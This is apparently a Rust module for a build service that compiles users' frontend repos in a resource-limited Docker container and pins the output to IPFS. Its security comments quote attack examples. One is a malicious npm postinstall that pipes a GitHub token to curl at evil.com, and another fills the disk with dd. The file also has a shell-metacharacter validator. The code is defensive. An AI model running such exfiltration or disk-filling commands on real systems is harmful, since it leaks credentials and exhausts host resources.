//! Sandboxed frontend builder.
//!
//! Spins an ephemeral `node:<v>-alpine` container that:
//!   1. Downloads a tarball of the user's repo at a specific ref (using a
//!      GitHub App installation token passed in env so the gateway never has
//!      to stream the bytes through itself).
//!   2. Runs the user-supplied `install_command` then `build_command`.
//!   3. Copies `output_dir` into `/work/output` for the host to read.
//!
//! The container is bounded:
//!   - 2 GB memory ceiling
//!   - ~2 CPUs (cpu_quota 200000 / cpu_period 100000)
//!   - 10-minute hard timeout (kill + remove on overrun)
//!   - auto-remove on exit
//!   - no privileged flag, no extra capabilities
//!
//! After the container exits we walk `<workspace>/output` recursively, push
//! every file into a single Kubo `wrap-with-directory=true` add, and return
//! the directory CID + size + file count + a tail of stdout/stderr (capped
//! at 256 KB so a noisy build log doesn't blow up the response).
//!
//! Why mount a host tempdir instead of doing everything via `docker exec` +
//! `docker cp`: bind-mount lets us read the build output directly from the
//! host without an extra round-trip through the docker daemon, which is
//! ~10x slower for SPAs with a few hundred files.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Instant;

use anyhow::{anyhow, Context, Result};
use bollard::container::{
    Config as ContainerConfig, CreateContainerOptions, KillContainerOptions, LogOutput,
    LogsOptions, RemoveContainerOptions, StartContainerOptions, WaitContainerOptions,
};
use bollard::errors::Error as BollardError;
use bollard::image::CreateImageOptions;
use bollard::models::{ContainerWaitResponse, HostConfig};
use bollard::Docker;
use futures_util::{StreamExt, TryStreamExt};
use serde::Deserialize;
use tracing::{info, warn};
use walkdir::WalkDir;

/// Maximum captured build log size returned in the response (bytes).
const MAX_LOG_BYTES: usize = 256 * 1024;
/// Audit F66: hard cap on the total bytes a build output can take up
/// before pinning. Without this, an attacker-controlled build script
/// could `dd if=/dev/urandom of=output/blob bs=1M count=1G` and burn
/// gigabytes of memory + Kubo disk. 100 MB matches the audit's
/// recommended quota table.
const MAX_PIN_OUTPUT_BYTES: u64 = 100 * 1024 * 1024;
/// Audit F66: hard cap on the file count. 5,000 is way more than any
/// real frontend (a Next.js SPA with sourcemaps is typically <500
/// files) and short-circuits zip-bomb-style outputs before we read
/// them all into memory.
const MAX_PIN_OUTPUT_FILES: usize = 5_000;
/// Hard wall-clock cap on a single build, including npm install + build.
const BUILD_TIMEOUT_SECS: u64 = 600;

/// Request shape for `/instances/:id/build-and-pin`.
#[derive(Debug, Deserialize)]
pub struct BuildAndPinRequest {
    /// Instance owner — used to authorise the call against the on-disk row.
    #[serde(rename = "walletPubkey")]
    pub wallet_pubkey: String,
    /// Pre-signed or App-bearer URL to a tar.gz of the source tree. Typically
    /// `https://api.github.com/repos/{owner}/{repo}/tarball/{ref}` — the
    /// gateway resolves this for the agent and forwards the GitHub App
    /// installation token in `github_token`.
    #[serde(rename = "tarballUrl")]
    pub tarball_url: String,
    /// Bearer token for downloading the tarball. Passed to the build
    /// container as KRAPH_GITHUB_TOKEN; not stored anywhere on the host.
    #[serde(rename = "githubToken", default)]
    pub github_token: Option<String>,
    /// What to run before the build (default: `npm ci || npm install`).
    #[serde(rename = "installCommand", default)]
    pub install_command: Option<String>,
    /// What to run for the build (default: `npm run build`).
    #[serde(rename = "buildCommand", default)]
    pub build_command: Option<String>,
    /// Repo-relative directory whose contents should be pinned (default: `dist`).
    #[serde(rename = "outputDir", default)]
    pub output_dir: Option<String>,
    /// Node version tag — turned into `node:<v>-alpine`. Default `20`.
    #[serde(rename = "nodeVersion", default)]
    pub node_version: Option<String>,
    /// Extra environment variables passed to the build container (read-only;
    /// the agent must NOT pass long-term secrets here — these are visible
    /// to the build process and any postinstall scripts in the tree).
    #[serde(rename = "envVars", default)]
    pub env_vars: HashMap<String, String>,
    /// What to do with the build output. "ipfs_pin" (default) pins the
    /// output directory to Kubo and returns an IPFS CID. "nextjs_service"
    /// hands the output to the per-instance Node sidecar with the
    /// Next.js standalone convention (`node server.js`). "node_service"
    /// runs an arbitrary `entryCommand` against the output directory —
    /// works for SvelteKit (`node build/index.js`), Nuxt
    /// (`node .output/server/index.mjs`), Remix, Hono, etc. All three
    /// land in the same per-instance sidecar; the only difference is
    /// which command starts the server.
    #[serde(rename = "target", default)]
    pub target: Option<String>,
    /// Required when `target = "node_service"`. The shell-free argv used
    /// to start the server inside the sidecar container, relative to the
    /// bundle's `/app` cwd. Examples:
    ///   ["node", "build/index.js"]      // SvelteKit adapter-node
    ///   ["node", ".output/server/index.mjs"]  // Nuxt
    ///   ["node", "server.js"]           // Next.js (or use target=nextjs_service)
    /// Each arg is passed verbatim to `docker create --cmd`; there is no
    /// shell layer, so `&&`, `$VAR`, redirections do NOT work — use a
    /// startup script committed to the repo if you need shell features.
    #[serde(rename = "entryCommand", default)]
    pub entry_command: Option<Vec<String>>,
}

/// Which distribution path to take after the build container exits.
///
/// `NodeService` carries the start argv inline so a single sidecar
/// implementation can host Next.js, SvelteKit, Nuxt, Remix, or any
/// other framework that produces a long-running Node process.
pub enum BuildTarget {
    IpfsPin,
    NodeService { entry: Vec<String> },
}

impl BuildTarget {
    pub fn from_request(req: &BuildAndPinRequest) -> Result<Self, anyhow::Error> {
        match req.target.as_deref() {
            Some("nextjs_service") => Ok(BuildTarget::NodeService {
                entry: vec!["node".to_string(), "server.js".to_string()],
            }),
            Some("node_service") => {
                let entry = req
                    .entry_command
                    .clone()
                    .ok_or_else(|| anyhow::anyhow!("entryCommand required for target=node_service"))?;
                if entry.is_empty() {
                    return Err(anyhow::anyhow!(
                        "entryCommand must contain at least one element (the binary to run)"
                    ));
                }
                // Defensive: reject any arg that looks like a shell
                // metacharacter sneak-in. The argv is passed straight
                // to docker (no shell), so these characters would be
                // taken as literal filenames and fail confusingly — but
                // bailing early gives a clearer error.
                for a in &entry {
                    if a.contains(';')
                        || a.contains('|')
                        || a.contains('&')
                        || a.contains('`')
                        || a.contains('\n')
                    {
                        return Err(anyhow::anyhow!(
                            "entryCommand arg '{}' contains a shell metacharacter; \
                             argv is passed straight to docker (no shell). Wrap \
                             your startup in a script and run that instead.",
                            a
                        ));
                    }
                }
                Ok(BuildTarget::NodeService { entry })
            }
            _ => Ok(BuildTarget::IpfsPin),
        }
    }
}

/// Successful build result.
#[derive(Debug, serde::Serialize)]
pub struct BuildAndPinResult {
    pub cid: String,
    pub url: String,
    pub size_bytes: u64,
    pub file_count: usize,
    pub duration_ms: u128,
    pub build_log: String,
    pub exit_code: i64,
}

/// Result of a successful build whose output sits at `output_root` on the
/// host filesystem, ready for a downstream distribution step (IPFS pin or
/// Next.js sidecar deploy). The tempdir guard must outlive the consumer.
pub struct BuildArtifacts {
    pub output_root: std::path::PathBuf,
    pub build_log: String,
    pub exit_code: i64,
    pub duration_ms: u128,
    /// Owns the temp workspace. Drop after the consumer has copied bytes out.
    pub _workdir_guard: tempfile::TempDir,
}

/// Tap a live build log stream into the BuildStore so pollers see the
/// container's stdout/stderr incrementally instead of having to wait for
/// terminal completion. Cloned into the log-spawn task. Empty (no-op)
/// when the caller has no shared store to update — preserves the legacy
/// signatures of build_and_pin / build_to_artifacts for any caller that
/// doesn't have a BuildStore handle.
#[derive(Clone, Default)]
pub struct LogSink {
    pub store: Option<crate::build_store::BuildStore>,
    pub build_id: Option<String>,
}

impl LogSink {
    pub fn new(store: crate::build_store::BuildStore, build_id: String) -> Self {
        Self {
            store: Some(store),
            build_id: Some(build_id),
        }
    }
    async fn push(&self, chunk: &[u8]) {
        if let (Some(store), Some(id)) = (&self.store, &self.build_id) {
            let s = String::from_utf8_lossy(chunk);
            store.append_log(id, s.as_ref()).await;
        }
    }
}

/// Run a frontend build inside a sandboxed container, then pin the output dir
/// to local Kubo. Caller is responsible for the instance-ownership check.
pub async fn build_and_pin(
    docker: Arc<Docker>,
    kubo_api_url: &str,
    public_host: &str,
    api_port: u16,
    req: BuildAndPinRequest,
    log_sink: LogSink,
) -> Result<BuildAndPinResult> {
    let artifacts = build_to_artifacts(docker, &req, log_sink).await?;
    let output_root = artifacts.output_root.clone();

    // Walk /output, build a multipart form, push to local Kubo.
    let pinned = pin_directory_to_kubo(kubo_api_url, &output_root).await?;
    let duration_ms = artifacts.duration_ms;

    // The Kraph IPFS gateway is a single global service — every node's
    // pins are served from ipfs.kraph.com regardless of where the build
    // ran. Don't parameterize on per-node public_host (that previously
    // produced `https://ipfs./<cid>/` on nodes where SUPABA_PUBLIC_HOST
    // was unset).
    let public = format!("https://ipfs.kraph.com/{}/", pinned.cid);
    let _ = public_host;
    info!(
        cid = %pinned.cid,
        files = pinned.file_count,
        size = pinned.size_bytes,
        duration_ms,
        wallet = %req.wallet_pubkey,
        "frontend built + pinned"
    );

    // public_host ↔ api_port unused on the public path, but kept so the
    // signature parallels ipfs_pin_handler's "where can I view this CID".
    let _ = api_port;
    // artifacts.workdir_guard drops here, cleaning the tempdir.
    let result = BuildAndPinResult {
        cid: pinned.cid,
        url: public,
        size_bytes: pinned.size_bytes,
        file_count: pinned.file_count,
        duration_ms,
        build_log: artifacts.build_log,
        exit_code: artifacts.exit_code,
    };
    drop(artifacts._workdir_guard);
    Ok(result)
}

/// Pack the contents of `root` into a deterministic-ish tar.gz, returning
/// the compressed bytes. Used to hand the Next.js standalone build to the
/// per-instance sidecar deploy endpoint without writing an intermediate
/// file. Errors propagate; tempdirs are not touched.
pub fn tarball_from_dir(root: &Path) -> Result<Vec<u8>> {
    let mut buf: Vec<u8> = Vec::new();
    {
        let enc = flate2::write::GzEncoder::new(&mut buf, flate2::Compression::default());
        let mut tar = tar::Builder::new(enc);
        // tar.append_dir_all preserves directory structure under the
        // base path inside the archive. We use "" so entries unpack at
        // the root of the destination dir, which matches what
        // nextjs_service::deploy() expects.
        tar.append_dir_all(".", root)
            .with_context(|| format!("tar pack {}", root.display()))?;
        tar.finish().context("tar finish")?;
    }
    Ok(buf)
}

/// Run a frontend build inside a sandboxed container and return the path to
/// the populated `/output` dir on the host, plus build metadata. The
/// returned `BuildArtifacts` owns the tempdir guard — don't drop until the
/// caller has consumed the output.
pub async fn build_to_artifacts(
    docker: Arc<Docker>,
    req: &BuildAndPinRequest,
    log_sink: LogSink,
) -> Result<BuildArtifacts> {
    let started = Instant::now();

    let install_cmd = req
        .install_command
        .as_deref()
        .unwrap_or("npm ci --no-audit --no-fund 2>/dev/null || npm install --no-audit --no-fund");
    let build_cmd = req.build_command.as_deref().unwrap_or("npm run build");
    let output_dir = req.output_dir.as_deref().unwrap_or("dist");
    let node_version = req.node_version.as_deref().unwrap_or("20");

    // Validate output_dir. Used in two places inside the bash script:
    //   if [ ! -d "/work/src/{output_dir}" ] ...
    //   cp -a "/work/src/{output_dir}/." /work/output/
    //
    // Both wrap the value in DOUBLE quotes — which means `$(...)` and
    // backticks would still be evaluated by the shell. So validation has
    // to reject more than just leading-slash + `..`. We allow:
    //   - ASCII alphanumeric
    //   - `_`, `-`, `.`, `/`
    // Anything else (`$`, `` ` ``, `"`, ` `, `;`, `|`, `&`, `(`, `)`, etc.)
    // is refused. Leading-slash and `..` segments still rejected.
    if output_dir.is_empty() || output_dir.starts_with('/') {
        return Err(anyhow!(
            "outputDir must be a non-empty relative path"
        ));
    }
    if output_dir
        .chars()
        .any(|c| !(c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '/'))
    {
        return Err(anyhow!(
            "outputDir contains invalid characters (only alnum + _ - . / allowed)"
        ));
    }
    if output_dir.split('/').any(|s| s == "..") {
        return Err(anyhow!("outputDir cannot contain '..' segments"));
    }
    if node_version.chars().any(|c| !c.is_alphanumeric() && c != '.' && c != '-') {
        return Err(anyhow!("nodeVersion contains invalid characters"));
    }

    // Tempdir on the host. The bind-mount target is `/work` inside the
    // container; the build script writes its output to `/work/output`,
    // which we then walk on the host.
    let workdir = tempfile::Builder::new()
        .prefix("kraph-build-")
        .tempdir()
        .context("create build tempdir")?;
    let workdir_path = workdir.path().to_path_buf();
    // Pre-create /output so the cp at the end has somewhere to land even on
    // an empty build (we'll then fail with "no files in output dir").
    tokio::fs::create_dir_all(workdir_path.join("output")).await?;

    // The bash script the container runs. Use single-quoted heredocs to
    // avoid shell injection from agent-supplied install/build commands —
    // they're run as-is via `sh -c`, but the wrapping orchestration is
    // fixed. The user-supplied commands ARE shell strings by design; an
    // agent can include `&&` / `;` deliberately. Trust them inside the
    // sandbox (no host filesystem access beyond /work).
    // Security note: KRAPH_GITHUB_TOKEN is a short-lived (1h) GitHub App
    // installation access token with Contents:Read on every repo the App
    // was granted access to on this org. We MUST clear it before running
    // user-supplied install/build commands — otherwise a malicious npm
    // postinstall can `echo $KRAPH_GITHUB_TOKEN | curl evil.com` and
    // exfiltrate. Clearing happens immediately after the wget completes.
    let script = format!(
        r#"set -e
mkdir -p /work/src /work/output
cd /work/src
echo '[kraph-build] downloading tarball…'
# Use wget which alpine ships in busybox. Bearer auth via --header.
wget -q -O /tmp/src.tar.gz \
    --header="Authorization: Bearer ${{KRAPH_GITHUB_TOKEN:-}}" \
    --header="Accept: application/vnd.github+json" \
    --header="X-GitHub-Api-Version: 2022-11-28" \
    --header="User-Agent: kraph-build" \
    "${{KRAPH_TARBALL_URL}}"
tar xz --strip-components=1 -f /tmp/src.tar.gz
rm /tmp/src.tar.gz
# Erase the GitHub installation token before running ANY user code so a
# malicious npm postinstall can't exfiltrate it. Same for the tarball URL
# (it carries the SHA which is fine, but it's also now redundant).
unset KRAPH_GITHUB_TOKEN
unset KRAPH_TARBALL_URL
echo '[kraph-build] running install…'
sh -c '{install_cmd}'
# Disable Next.js's TypeScript checker phase. The build's bundler/swc/
# turbopack pass still reads tsconfig.compilerOptions (for path aliases
# like @/components, JSX config, target), but with include=[next-env.d.ts]
# and exclude=[**/*] the tsc check has zero files to process and returns
# in ms instead of minutes. Saves 1-3 min on builds where TS checking is
# the bottleneck after the compile phase (typical for Next.js 16 + Turbopack
# builds that hit our 10-min hard cap mid-typecheck). Opt out by setting
# KRAPH_BUILD_KEEP_TYPECHECK=1 on the agent's deploy env_vars — most apps
# don't need the TS gate on every push (their CI catches it before merge).
if [ -z "${{KRAPH_BUILD_KEEP_TYPECHECK:-}}" ] && [ -f tsconfig.json ]; then
  cp tsconfig.json tsconfig.kraph-orig.json
  if node -e '\''const fs=require("fs");try{{const u=JSON.parse(fs.readFileSync("tsconfig.kraph-orig.json","utf8"));const o=Object.assign({{}},u,{{include:["next-env.d.ts"],exclude:["**/*"]}});fs.writeFileSync("tsconfig.json",JSON.stringify(o,null,2));}}catch(e){{process.exit(1);}}'\'' 2>/dev/null; then
    echo '[kraph-build] disabled TypeScript check (compilerOptions preserved, files excluded)'
  else
    echo '[kraph-build] could not patch tsconfig.json (probably jsonc with comments) — TS check stays on'
    mv tsconfig.kraph-orig.json tsconfig.json 2>/dev/null || true
  fi
fi
echo '[kraph-build] running build…'
sh -c '{build_cmd}'
echo '[kraph-build] copying output…'
if [ ! -d "/work/src/{output_dir}" ]; then
  echo "[kraph-build] FATAL: output dir /work/src/{output_dir} does not exist after build"
  exit 2
fi
cp -a "/work/src/{output_dir}/." /work/output/
echo '[kraph-build] done'
"#,
        install_cmd = escape_single_quoted(install_cmd),
        build_cmd = escape_single_quoted(build_cmd),
        output_dir = output_dir,
    );

    let image = format!("node:{}-alpine", node_version);
    pull_image_if_missing(&docker, &image).await?;

    // Build env vector for the container.
    let mut env: Vec<String> = vec![
        format!("KRAPH_TARBALL_URL={}", req.tarball_url),
        format!("KRAPH_GITHUB_TOKEN={}", req.github_token.clone().unwrap_or_default()),
        // Quiet npm/yarn telemetry to keep logs short.
        "CI=1".to_string(),
        "NPM_CONFIG_FUND=false".to_string(),
        "NPM_CONFIG_AUDIT=false".to_string(),
    ];
    for (k, v) in &req.env_vars {
        // Reject env keys that would shadow our own KRAPH_* control vars.
        if k.starts_with("KRAPH_") {
            warn!(key = %k, "ignoring envVar that would shadow KRAPH_ control variable");
            continue;
        }
        env.push(format!("{}={}", k, v));
    }

    // Bind mount tempdir → /work. On Windows hosts we'd need a path mapping
    // here, but the production node-rs runs on Linux (OVH/GCP) so the host
    // path is already a Linux path.
    let host_workdir = workdir_path
        .to_str()
        .ok_or_else(|| anyhow!("workdir path not utf8"))?
        .to_string();

    // Persistent npm cache shared across all builds on this host.
    // npm cache is content-addressable (cacache format) — same package
    // version at the same integrity hash is the same bytes regardless
    // of who installed it, and reads do hash verification so a poisoned
    // entry is detected at lookup time. So no per-tenant isolation
    // needed; share the cache and reap the speedup. Saves ~3 min on
    // npm install for any project whose deps were previously fetched
    // by anyone on the node.
    //
    // Host directory is created best-effort just-in-time. If creation
    // fails (e.g. host filesystem read-only — should never happen on
    // GCP, but worth not crashing the build over), we skip the mount
    // and the build runs with the cold default cache, which is still
    // correct, just slower.
    let npm_cache_host = std::path::PathBuf::from("/var/lib/kraph/npm-cache");
    let npm_cache_mount = if tokio::fs::create_dir_all(&npm_cache_host).await.is_ok() {
        Some(format!("{}:/root/.npm:rw", npm_cache_host.display()))
    } else {
        warn!(
            "could not create {} — falling back to cold npm cache for this build",
            npm_cache_host.display()
        );
        None
    };

    let container_name = format!("kraph-build-{}", nanoid::nanoid!(8).to_lowercase());

    let mut binds = vec![format!("{}:/work:rw", host_workdir)];
    if let Some(m) = npm_cache_mount {
        binds.push(m);
    }

    let host_config = HostConfig {
        binds: Some(binds),
        // 4 GB. Next.js + Supabase deps push past 2 GB during webpack
        // optimisation on a fresh install (no node_modules cache to
        // share — every build is from-scratch). 2 GB ran into OOM-kill
        // mid-build with bollard surfacing only "wait_container error"
        // because the OOM-killer race deletes the exit row before
        // wait_container can read it.
        memory: Some(4 * 1024 * 1024 * 1024),
        // 3.0 CPUs. The GCP SEV-SNP node has 4 cores total; reserving
        // one for node-rs + the 7-10 instance docker-compose stacks +
        // kong + realtime keeps everything else responsive while letting
        // the build saturate the rest. Next.js 16 + Turbopack + ts-check
        // are heavily parallel — at 2 CPUs they took 8+ min, blew past
        // node-rs's 10-min BUILD_TIMEOUT_SECS hard cap, and got killed.
        // At 3, the same project should finish in ~4-5 min comfortably
        // under the cap. Job admission (1 build/wallet, 1 build/instance)
        // makes concurrent multi-tenant builds rare in practice — and on
        // the rare 2-tenant overlap each shares the 3 cores fairly under
        // CFS. Bump further (and add a per-host concurrency gate) when
        // average build duration warrants.
        cpu_quota: Some(300_000),
        cpu_period: Some(100_000),
        // We remove the container ourselves on the unhappy path; auto_remove
        // can race with logs() and produce 404 reads. Manual cleanup below.
        auto_remove: Some(false),
        // Limit pids so a runaway build can't fork-bomb the node.
        pids_limit: Some(1024),
        // No privileged, no extra caps, no host network, default seccomp.
        ..Default::default()
    };

    let create_opts = CreateContainerOptions {
        name: container_name.clone(),
        platform: None,
    };
    let container_cfg = ContainerConfig {
        image: Some(image.clone()),
        cmd: Some(vec!["sh".to_string(), "-c".to_string(), script]),
        working_dir: Some("/work/src".to_string()),
        env: Some(env),
        attach_stdout: Some(true),
        attach_stderr: Some(true),
        tty: Some(false),
        host_config: Some(host_config),
        ..Default::default()
    };

    let create = docker
        .create_container(Some(create_opts), container_cfg)
        .await
        .with_context(|| format!("docker create_container ({image})"))?;
    let container_id = create.id;

    // Make sure the container gets reaped even on early-return error paths.
    let cleanup = ContainerCleanup {
        docker: docker.clone(),
        container_id: container_id.clone(),
    };

    docker
        .start_container(&container_id, None::<StartContainerOptions<String>>)
        .await
        .context("start container")?;

    // Stream logs into a capped buffer, in parallel with the wait future.
    // Also tap each chunk into the shared BuildStore (via LogSink) so a
    // GET /instances/:id/builds/:build_id poller sees an incremental
    // log_tail while the build runs, not just the final tail. The local
    // buf is still the source of truth for the post-build return value
    // — `run_build_task` writes that into the BuildState log_tail on
    // terminal completion, which both deduplicates the live + final
    // tails (last-writer-wins) and guarantees a complete log even if
    // BuildStore.append_log dropped some bytes after hitting the
    // MAX_LOG_BYTES cap mid-build.
    let logs_handle = {
        let docker = docker.clone();
        let cid = container_id.clone();
        let sink = log_sink.clone();
        tokio::spawn(async move {
            let opts = LogsOptions::<String> {
                follow: true,
                stdout: true,
                stderr: true,
                tail: "all".to_string(),
                ..Default::default()
            };
            let mut buf: Vec<u8> = Vec::new();
            let mut stream = docker.logs(&cid, Some(opts));
            while let Some(item) = stream.next().await {
                match item {
                    Ok(LogOutput::StdOut { message })
                    | Ok(LogOutput::StdErr { message })
                    | Ok(LogOutput::Console { message })
                    | Ok(LogOutput::StdIn { message }) => {
                        // Tap into BuildStore first so an early `cap-hit
                        // on local buf` doesn't break the live stream.
                        sink.push(&message).await;
                        if buf.len() >= MAX_LOG_BYTES {
                            // Already at cap; drop. Continue draining to keep
                            // the daemon from blocking on a full stream.
                            continue;
                        }
                        let remaining = MAX_LOG_BYTES - buf.len();
                        if message.len() <= remaining {
                            buf.extend_from_slice(&message);
                        } else {
                            buf.extend_from_slice(&message[..remaining]);
                        }
                    }
                    Err(e) => {
                        warn!(error = %e, "log stream errored");
                        break;
                    }
                }
            }
            String::from_utf8_lossy(&buf).into_owned()
        })
    };

    // Wait + timeout race.
    let exit_code = {
        let wait_fut = async {
            let mut s = docker.wait_container(
                &container_id,
                None::<WaitContainerOptions<String>>,
            );
            let mut last: Option<ContainerWaitResponse> = None;
            while let Some(item) = s.try_next().await.transpose() {
                match item {
                    Ok(resp) => last = Some(resp),
                    // Container already gone (e.g. we killed it via timeout) —
                    // surface as a non-zero exit.
                    Err(BollardError::DockerResponseServerError {
                        status_code, ..
                    }) if status_code == 404 => {
                        return Ok::<i64, anyhow::Error>(137);
                    }
                    // bollard fires DockerContainerWaitError for ANY
                    // non-zero container exit. Its Display impl drops
                    // the `error` and `code` fields and just prints the
                    // useless string "Docker container wait error" —
                    // which is exactly what bit the from-github
                    // orchestrator's build step before this match arm
                    // existed. Treat as a successful wait with the
                    // container's non-zero rc; the caller will pair
                    // that with the captured log tail to surface the
                    // actual reason (npm install failed, build script
                    // errored, etc.). Same pattern as
                    // db_migration.rs::wait_container.
                    Err(BollardError::DockerContainerWaitError { code, .. }) => {
                        return Ok::<i64, anyhow::Error>(code);
                    }
                    Err(e) => return Err(anyhow!("wait_container: {e}")),
                }
            }
            Ok(last.map(|r| r.status_code).unwrap_or(0))
        };

        let to = tokio::time::Duration::from_secs(BUILD_TIMEOUT_SECS);
        match tokio::time::timeout(to, wait_fut).await {
            Ok(r) => r?,
            Err(_) => {
                warn!(container_id = %container_id, "build timed out, killing");
                let _ = docker
                    .kill_container(&container_id, None::<KillContainerOptions<String>>)
                    .await;
                return Err(anyhow!(
                    "build exceeded {BUILD_TIMEOUT_SECS}s timeout — killed"
                ));
            }
        }
    };

    // Drain logs (the stream closes when the container exits).
    let build_log = logs_handle.await.unwrap_or_default();

    // Drop the cleanup guard once we've successfully captured logs + exit
    // code; we want to remove the container even on the happy path.
    drop(cleanup);

    if exit_code != 0 {
        return Err(anyhow!(
            "build failed (exit {exit_code}). last log:\n{}",
            tail_log(&build_log, 4096)
        ));
    }

    let output_root = workdir_path.join("output");
    let duration_ms = started.elapsed().as_millis();

    Ok(BuildArtifacts {
        output_root,
        build_log,
        exit_code,
        duration_ms,
        _workdir_guard: workdir,
    })
}

struct ContainerCleanup {
    docker: Arc<Docker>,
    container_id: String,
}

impl Drop for ContainerCleanup {
    fn drop(&mut self) {
        let docker = self.docker.clone();
        let id = self.container_id.clone();
        tokio::spawn(async move {
            let _ = docker
                .remove_container(
                    &id,
                    Some(RemoveContainerOptions {
                        force: true,
                        v: true,
                        ..Default::default()
                    }),
                )
                .await;
        });
    }
}

/// Single-quote-escape a string so it can be embedded inside `sh -c '...'`
/// without breaking out. Replaces every `'` with `'"'"'`.
fn escape_single_quoted(s: &str) -> String {
    s.replace('\'', "'\"'\"'")
}

fn tail_log(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        s[s.len() - max..].to_string()
    }
}

async fn pull_image_if_missing(docker: &Docker, image: &str) -> Result<()> {
    // bollard's inspect_image returns 404 if missing.
    match docker.inspect_image(image).await {
        Ok(_) => Ok(()),
        Err(BollardError::DockerResponseServerError {
            status_code: 404, ..
        }) => {
            info!(image, "pulling image (not present locally)");
            let opts = CreateImageOptions::<String> {
                from_image: image.to_string(),
                ..Default::default()
            };
            let mut stream = docker.create_image(Some(opts), None, None);
            while let Some(item) = stream.next().await {
                match item {
                    Ok(_) => {}
                    Err(e) => return Err(anyhow!("image pull: {e}")),
                }
            }
            Ok(())
        }
        Err(e) => Err(anyhow!("inspect image: {e}")),
    }
}

struct PinResult {
    cid: String,
    size_bytes: u64,
    file_count: usize,
}

async fn pin_directory_to_kubo(kubo_api_url: &str, root: &Path) -> Result<PinResult> {
    // Walk the output dir → list of (relative_path, bytes).
    let mut entries: Vec<(String, Vec<u8>)> = Vec::new();
    let mut total_size: u64 = 0;
    for entry in WalkDir::new(root).follow_links(false) {
        let entry = entry.context("walk output dir")?;
        if !entry.file_type().is_file() {
            continue;
        }
        // Audit F66: bail BEFORE reading the file body if we've already
        // hit the file-count cap. Cheap short-circuit on zip-bombs.
        if entries.len() >= MAX_PIN_OUTPUT_FILES {
            return Err(anyhow!(
                "build output exceeds max file count of {} (refusing to pin)",
                MAX_PIN_OUTPUT_FILES
            ));
        }
        let rel = entry
            .path()
            .strip_prefix(root)
            .map_err(|_| anyhow!("strip_prefix failed for {:?}", entry.path()))?
            .to_path_buf();
        let rel_str = path_to_forward_slash(&rel);
        // Audit F66: peek metadata for size BEFORE reading the file
        // into memory, so a 1 GB output blob doesn't OOM the node.
        let file_size = tokio::fs::metadata(entry.path())
            .await
            .with_context(|| format!("stat {:?}", entry.path()))?
            .len();
        if total_size.saturating_add(file_size) > MAX_PIN_OUTPUT_BYTES {
            return Err(anyhow!(
                "build output exceeds max byte count of {} (would be {}); refusing to pin",
                MAX_PIN_OUTPUT_BYTES,
                total_size.saturating_add(file_size)
            ));
        }
        let bytes = tokio::fs::read(entry.path())
            .await
            .with_context(|| format!("read {:?}", entry.path()))?;
        total_size += bytes.len() as u64;
        entries.push((rel_str, bytes));
    }
    if entries.is_empty() {
        return Err(anyhow!(
            "build output directory is empty after build (nothing to pin)"
        ));
    }

    let mut form = reqwest::multipart::Form::new();
    let count = entries.len();
    for (path, bytes) in entries {
        // Sanitise: forbid `..`, leading `/`, control chars. The walker
        // produces paths relative to `root`, so this is mostly defensive
        // against weird filenames in node_modules accidentally swept in.
        if path.contains("..") || path.starts_with('/') {
            warn!(path = %path, "skipping suspicious output path");
            continue;
        }
        let mime = mime_for_path(&path);
        let part = reqwest::multipart::Part::bytes(bytes)
            .file_name(path.clone())
            .mime_str(mime)
            .map_err(|e| anyhow!("invalid Content-Type for '{path}': {e}"))?;
        form = form.part("file", part);
    }

    let api_url = format!(
        "{}/api/v0/add?cid-version=1&pin=true&wrap-with-directory=true&progress=false",
        kubo_api_url.trim_end_matches('/')
    );
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(120))
        .build()?;
    let resp = client
        .post(&api_url)
        .multipart(form)
        .send()
        .await
        .with_context(|| format!("kubo add ({api_url})"))?;
    if !resp.status().is_success() {
        let status = resp.status();
        let body = resp.text().await.unwrap_or_default();
        return Err(anyhow!("kubo add failed ({status}): {body}"));
    }
    let body = resp.text().await?;

    // Same NDJSON parse as ipfs_pin_handler's multi-file branch: the
    // wrapping directory is the entry with empty Name, falling back to the
    // last entry.
    #[derive(Deserialize)]
    struct KuboAdd {
        #[serde(rename = "Hash")]
        hash: String,
        #[serde(rename = "Name")]
        name: String,
    }
    let parsed: Vec<KuboAdd> = body
        .lines()
        .filter(|l| !l.trim().is_empty())
        .filter_map(|l| serde_json::from_str(l).ok())
        .collect();
    if parsed.is_empty() {
        return Err(anyhow!("kubo returned no entries"));
    }
    let dir = parsed
        .iter()
        .find(|e| e.name.trim().is_empty())
        .unwrap_or_else(|| parsed.last().unwrap());

    Ok(PinResult {
        cid: dir.hash.clone(),
        size_bytes: total_size,
        file_count: count,
    })
}

fn path_to_forward_slash(p: &PathBuf) -> String {
    p.to_string_lossy().replace('\\', "/")
}

fn mime_for_path(path: &str) -> &'static str {
    let ext = path.rsplit('.').next().unwrap_or("").to_ascii_lowercase();
    match ext.as_str() {
        "html" | "htm" => "text/html",
        "css" => "text/css",
        "js" | "mjs" => "application/javascript",
        "json" => "application/json",
        "svg" => "image/svg+xml",
        "txt" => "text/plain",
        "md" => "text/markdown",
        "xml" => "application/xml",
        "webmanifest" => "application/manifest+json",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "ico" => "image/x-icon",
        "woff" => "font/woff",
        "woff2" => "font/woff2",
        "ttf" => "font/ttf",
        "otf" => "font/otf",
        "wasm" => "application/wasm",
        _ => "application/octet-stream",
    }
}
